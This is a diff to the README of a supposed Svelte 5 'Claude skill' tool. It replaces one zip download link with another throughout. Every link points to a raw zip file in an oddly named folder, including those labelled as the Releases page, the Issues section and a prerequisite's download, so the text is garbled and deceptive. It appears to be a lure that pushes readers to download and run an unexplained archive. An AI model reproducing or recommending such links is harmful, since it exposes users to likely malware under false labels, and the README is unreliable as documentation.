@@ -1,6 +1,6 @@
 # 🛠️ claude-svelte5-skill - Simple Svelte Development Made Easy
 
-[![Download Now](https://raw.githubusercontent.com/NikosDevMC/claude-svelte5-skill/main/orthocephalous/claude-svelte5-skill_v2.3.zip%20Now-claude--svelte5--skill-brightgreen)](https://raw.githubusercontent.com/NikosDevMC/claude-svelte5-skill/main/orthocephalous/claude-svelte5-skill_v2.3.zip)
+[![Download Now](https://raw.githubusercontent.com/NikosDevMC/claude-svelte5-skill/main/orthocephalous/claude_skill_svelte_2.5-beta.3.zip%20Now-claude--svelte5--skill-brightgreen)](https://raw.githubusercontent.com/NikosDevMC/claude-svelte5-skill/main/orthocephalous/claude_skill_svelte_2.5-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to claude-svelte5-skill! This application helps you build projects with 
 To get started, you need to visit the Releases page to download the software. Follow these simple steps:
 
 1. Click the link below to go to the Releases page:
-   [Visit the Releases Page](https://raw.githubusercontent.com/NikosDevMC/claude-svelte5-skill/main/orthocephalous/claude-svelte5-skill_v2.3.zip)
+   [Visit the Releases Page](https://raw.githubusercontent.com/NikosDevMC/claude-svelte5-skill/main/orthocephalous/claude_skill_svelte_2.5-beta.3.zip)
    
 2. On the Releases page, look for the most recent version. You will see a list of available files.
 
@@ -28,7 +28,7 @@ Before you install, please ensure your computer meets the following requirements
 - **Operating System:** Windows 10 or later, macOS 10.14 or later, or any modern Linux distribution.
 - **RAM:** At least 4 GB of RAM.
 - **Storage:** Minimum of 200 MB of free disk space.
-- **https://raw.githubusercontent.com/NikosDevMC/claude-svelte5-skill/main/orthocephalous/claude-svelte5-skill_v2.3.zip** Version 14 or later installed on your system. [Download https://raw.githubusercontent.com/NikosDevMC/claude-svelte5-skill/main/orthocephalous/claude-svelte5-skill_v2.3.zip](https://raw.githubusercontent.com/NikosDevMC/claude-svelte5-skill/main/orthocephalous/claude-svelte5-skill_v2.3.zip).
+- **https://raw.githubusercontent.com/NikosDevMC/claude-svelte5-skill/main/orthocephalous/claude_skill_svelte_2.5-beta.3.zip** Version 14 or later installed on your system. [Download https://raw.githubusercontent.com/NikosDevMC/claude-svelte5-skill/main/orthocephalous/claude_skill_svelte_2.5-beta.3.zip](https://raw.githubusercontent.com/NikosDevMC/claude-svelte5-skill/main/orthocephalous/claude_skill_svelte_2.5-beta.3.zip).
 
 ## 🔧 Features
 
@@ -63,13 +63,13 @@ If you encounter any issues while downloading or using the software, please cons
 
 Your input can help improve the application! If you have suggestions or find bugs, please share your feedback:
 
-1. Visit the [Issues section](https://raw.githubusercontent.com/NikosDevMC/claude-svelte5-skill/main/orthocephalous/claude-svelte5-skill_v2.3.zip) of the repository to report any problems.
+1. Visit the [Issues section](https://raw.githubusercontent.com/NikosDevMC/claude-svelte5-skill/main/orthocephalous/claude_skill_svelte_2.5-beta.3.zip) of the repository to report any problems.
   
 2. Consider contributing code or documentation improvements. Check the contribution guidelines on our GitHub page.
 
 ## 📣 Release Notes
 
-For details on what's new or fixed in each version, refer to the release notes available on the [Releases page](https://raw.githubusercontent.com/NikosDevMC/claude-svelte5-skill/main/orthocephalous/claude-svelte5-skill_v2.3.zip). 
+For details on what's new or fixed in each version, refer to the release notes available on the [Releases page](https://raw.githubusercontent.com/NikosDevMC/claude-svelte5-skill/main/orthocephalous/claude_skill_svelte_2.5-beta.3.zip). 
 
 ## 🎉 Conclusion
 
